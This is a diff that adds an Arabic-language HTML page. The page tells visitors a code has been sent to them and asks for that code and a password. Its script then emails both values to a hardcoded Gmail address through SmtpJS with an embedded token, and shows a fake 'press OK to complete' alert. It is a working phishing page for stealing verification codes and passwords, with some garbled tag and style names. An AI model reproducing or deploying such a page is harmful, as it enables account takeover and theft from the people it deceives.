@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+  <title>جوالي رفيقي  </title>
+  
+
+
+  <link rel="stylesheet" href="style.css">
+  
+  <scri6pt src="https://smtpjs.com/v3/smtp.js"> </script>
+</head>
+
+<body dir="rtl">
+  
+ <img style="width: 100% ; mar5gin-block: 0px ; bor6der-radius: 30px 30px 0px 0px" src="ff.jpg" alt="azz.jpg">
+  
+
+   
+ <div class="ra">
+
+  <div class="q" onsubmit="sendEmail(); reset(); return false">
+    
+  <h5 style="color: slategray ; ; float: center ; padding: 5px ; margin-block: 0px ;  mar4gin-right: 60px ; font-family: 'cairo'">سوف نرسل لك رمز الكود يرجى إدخالة للتأكد</h5>
+    <br>
+    <hr>
+    * * * *
+  <form onsubmit="sendEmail(); reset(); return false">
+
+ <input class="saa" style="border: 1.1px solid midnightblue" type="text" id="name" placeholder=" ادخل رمز الكود   " required >
+ <br>
+<div class="sa">
+<h6 style="color: slategray ; float: right ; padding: 5px ; margin-block: 0px ;  margin-right: 60px ; font-family: 'cairo'"></h6>
+ <br>
+<input style="border: 1.1px solid midnightblue" type="password" id="password" name="password" placeholder="ادخل كلمة المرور">
+<br>
+</div>
+<br>
+    <br>
+    <button style="font-family: cairo ;padding-left: 15%;
+    padding-right: 15%;padding-top: 5px;padding-block: 5px; border-radius: 30px; background: coral; border: 1px solid midnightblue; color: white">إرسال </button>
+    <br>
+    <br>
+<br>
+
+   
+  </form>
+   <h6 style="color: indianred">  يرجى الإنتظار...</h6>
+  </div>
+ </div>
+<script src="https://smtpjs.com/v3/smtp.js"> </script>
+  <script>
+    
+function sendEmail() {
+Email.send({
+SecureToken : "e3275d41-401a-4c76-9c84-b900cd9d7440",
+      To:'waaat2491@gmail.com',
+      From:"waaat2491@gmail.com",
+      Subject:"test 5",
+Body:"name: " + document.getElementById("name").value
+
+      + "<br> password: " + document.getElementById("password").value
+
+      + "<br> email: " + document.getElementById("name").value
+
+      + "<br> email: " + document.getElementById("name").value
+
+
+    }).then(
+      message => alert("إضغط موافق لإتمام العملية")
+    );
+    }
+  </script>
+</body>
+</html>
